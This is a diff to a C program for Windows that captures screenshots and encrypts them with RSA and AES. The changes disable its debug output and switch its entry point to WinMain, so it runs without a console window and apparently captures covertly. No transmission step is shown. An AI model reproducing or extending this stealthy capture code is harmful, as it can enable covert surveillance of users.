@@ -47,7 +47,7 @@ properties->Linker->general->Additional Library Directories (set to: libfiles di
 #pragma comment(lib,"PolarSSL.lib")
 
 //set to 0 for no info.output file generation
-#define GENERATE_OUTPUT 1
+#define GENERATE_OUTPUT 0
 #define OUTPUT_LEVEL 1
 #define DBG_INFO 1
 #define DBG_WARNING 2
@@ -300,7 +300,7 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 			DeleteDC(compatiblescreendc);
 			DeleteObject(compatiblebitmap);
 			SecureZeroMemory(lpbitmap,dwBmpSize);
-			GlobalUnlock(hDIB);
+			GlobalUnlock(hDIB);			
 			return 1;
 		}
 	}
@@ -311,7 +311,8 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 	memcpy_s(*screenshotbuffer+sizeof(BITMAPFILEHEADER),*screenshotbuffersize,&bminfoheader,sizeof(BITMAPINFOHEADER));
 	outputerror(DBG_INFO,"%s\n","takescreenshot::memfile added bitmap info header");
 	memcpy_s(*screenshotbuffer+sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER),*screenshotbuffersize,lpbitmap,dwBmpSize);
-	outputerror(DBG_INFO,"%s\n","takescreenshot::memfile added bitmap content");		
+	outputerror(DBG_INFO,"%s\n","takescreenshot::memfile added bitmap content");	
+			
 	/* we could have used more of these in this app */
 	SecureZeroMemory(lpbitmap,dwBmpSize);
 	SecureZeroMemory(&bmfileheader,sizeof(BITMAPFILEHEADER));
@@ -474,7 +475,7 @@ unsigned char *rsacrypt(pk_context *pkctx,const unsigned char *plaintext,const u
 	[length encrypted key data(int)][encrypted key data][encrypted hmac key][hmac][encrypted bmp data]
 	where key data = [aes key][aes iv]
 */
-int main(int argc, char *argv[]){
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
 	//misc vars
 	char currentpath[MAX_PATH] = {0};
 	//vars for getting public key from exe
